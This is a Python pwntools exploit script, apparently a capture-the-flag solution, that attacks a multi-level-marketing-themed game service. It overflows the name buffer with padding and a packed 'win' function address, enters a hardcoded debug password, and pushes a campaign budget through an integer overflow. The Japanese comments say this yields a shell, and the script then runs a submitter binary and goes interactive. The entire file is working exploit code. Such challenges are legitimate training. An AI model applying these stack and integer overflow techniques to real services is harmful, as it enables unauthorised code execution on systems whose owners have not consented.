#!/usr/bin/env python3

from pwn import *

context.log_level = "CRITICAL"

context.arch = "amd64"
addr_win = 0x4015EA
player_name = b"A" * (40 + 4 + 4 + 8) + pack(addr_win)
# player_name = b"player_name" * 32

HOST = os.environ.get("HOST", "localhost")
PORT = 31337


io = remote(HOST, int(PORT))

DUMP = 0


def CLEAN_AND_PRINT(received: bytes):
    # received += io.clean(timeout=0)
    if DUMP:
        print(received.decode())


def SEND_LINE_AFTER(delim: bytes, data: bytes):
    received = io.recvuntil(delim)
    CLEAN_AND_PRINT(received)
    io.sendline(data)


def RECV_LINE_CONTAINS(items: bytes):
    received = io.recvline_contains(items)
    CLEAN_AND_PRINT(received)
    return received


def RECV_LINE() -> bytes:
    received = io.recvline()
    if DUMP:
        print(received.decode())
    return received


SEND_LINE_AFTER(b"Enter your name:", player_name)

# 最高のregionを確認
SEND_LINE_AFTER(b"Choice: ", b"9")
SEND_LINE_AFTER(b"Enter debug password:", b"mlm_debug_2025")
SEND_LINE_AFTER(b"Choice: ", b"1")
RECV_LINE_CONTAINS(b"----------|-----------|-----------")


def get_best_region_index() -> int:
    l = []
    for i in range(5):
        line = RECV_LINE().decode()
        line_splitted = line.split("|")
        # print(f"{line = }")
        assert len(line_splitted) == 3
        name = line_splitted[0]
        risk = float(line_splitted[1])
        reward = float(line_splitted[2])
        l.append((i, risk, reward))
    l.sort(key=lambda t: t[2], reverse=True)
    return l[0][0] + 1  # 1-indexed


best_region_index = get_best_region_index()
print(f"{best_region_index = }")


# Product購入

SEND_LINE_AFTER(b"Choice: ", b"C")
RECV_LINE_CONTAINS(
    "╚═══════════════════════════════════════════════════════════════╝".encode()
)


def buy_best_product():
    l = []
    for i in range(6):
        RECV_LINE()
        item = RECV_LINE().decode()
        RECV_LINE()
        RECV_LINE()

        cost = int(item.split("Cost: $")[1].split()[0])
        suggested_prices = int(item.split("Suggested Sale Price: $")[1].split()[0])
        risk_factor = int(item.split("Risk Factor: ")[1])
        l.append((i, cost - suggested_prices, risk_factor))

    m = min(*l, key=lambda item: (item[1], item[2]))
    best_index = m[0]
    SEND_LINE_AFTER(
        b"Would you like to acquire a product for your MLM? (1-6, 0 to cancel):",
        str(best_index + 1).encode(),
    )


buy_best_product()


# Agent雇い
SEND_LINE_AFTER(b"Choice: ", b"D")
SEND_LINE_AFTER(b"Choice: ", b"H")
SEND_LINE_AFTER(b"Enter agent name:", b"awasome person")
SEND_LINE_AFTER(b"Choice: ", b"X")

# 残高確認
line = RECV_LINE_CONTAINS(b"| MONEY: $").decode()
money = int(line.split("| MONEY: $")[1].split(" ")[0])
print(f"{money = }")

# Campiagn
SEND_LINE_AFTER(b"Choice: ", b"A")
SEND_LINE_AFTER(b"Choice: ", b"C")
SEND_LINE_AFTER(b"Enter campaign name:", b"excellent miracle campaign")
SEND_LINE_AFTER(b"Enter campaign budget:", str(money).encode())
SEND_LINE_AFTER(b"Region:", str(best_region_index).encode())
SEND_LINE_AFTER(b"Choice: ", b"1")  # 最後に勝ったものがいいはず
SEND_LINE_AFTER(b"Agent ID: ", b"1")  # 最後に勝ったものがいいはず
SEND_LINE_AFTER(b"Keyword 1:", b"AwesomeFantastic")
SEND_LINE_AFTER(b"Keyword 2:", b"AwesomeFantastic")
SEND_LINE_AFTER(b"Keyword 3:", b"AwesomeFantastic")
SEND_LINE_AFTER(b"Keyword 4:", b"AwesomeFantastic")
SEND_LINE_AFTER(b"Keyword 5:", b"AwesomeFantastic")

# 予算をオーバーフローさせたい
SEND_LINE_AFTER(b"Choice: ", b"E")
SEND_LINE_AFTER(b"Which campaign would you like to edit? (0 to cancel):", b"1")
SEND_LINE_AFTER(b"Edit campaign budget", b"-2100000000")
SEND_LINE_AFTER(b"Would you like to change the agent?", b"n")
SEND_LINE_AFTER(b"Would you like to change the product?", b"n")

SEND_LINE_AFTER(b"Choice: ", b"E")
SEND_LINE_AFTER(b"Which campaign would you like to edit? (0 to cancel):", b"1")
SEND_LINE_AFTER(b"Edit campaign budget", b"2100000000")
SEND_LINE_AFTER(b"Would you like to change the agent?", b"n")
SEND_LINE_AFTER(b"Would you like to change the product?", b"n")

SEND_LINE_AFTER(b"Choice: ", b"X")

# 次の日
SEND_LINE_AFTER(b"Choice: ", b"N")

# シェルが取れているのでsubmitter起動
SEND_LINE_AFTER(
    b"You've mastered the art of Multi-Level Model Marketing!", b"./submitter"
)

io.interactive("")
